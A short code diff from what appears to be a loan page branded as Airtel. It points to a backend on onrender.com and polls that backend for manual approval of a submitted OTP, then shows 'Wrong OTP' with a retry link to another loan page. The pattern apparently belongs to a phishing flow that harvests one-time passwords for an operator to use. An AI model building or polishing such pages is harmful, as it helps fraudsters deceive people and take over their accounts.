@@ -123,7 +123,8 @@
         }
 
         const backendUrl =
-          localStorage.getItem("backendUrl") || "https://airtel-01.onrender.com";  // fallback to Render service
+          localStorage.getItem("backendUrl") ||
+          "https://airtel-01.onrender.com"; // fallback to Render service
 
         // Poll backend for approval
         pollInterval = setInterval(async () => {
@@ -152,7 +153,7 @@
               statusEl.textContent = "❌ Rejected";
               statusEl.style.color = "#f44336";
               if (verifyText)
-                verifyText.innerHTML = `OTP rejected: ${data.message}. <a href="loan5.html" style="color:#1abc9c;">Try again</a>`;
+                verifyText.innerHTML = `Wrong OTP. <a href="loan5.html" style="color:#1abc9c;">Try again</a>`;
             } else {
               statusEl.textContent = "⏳ Waiting...";
               statusEl.style.color = "#ff9800";
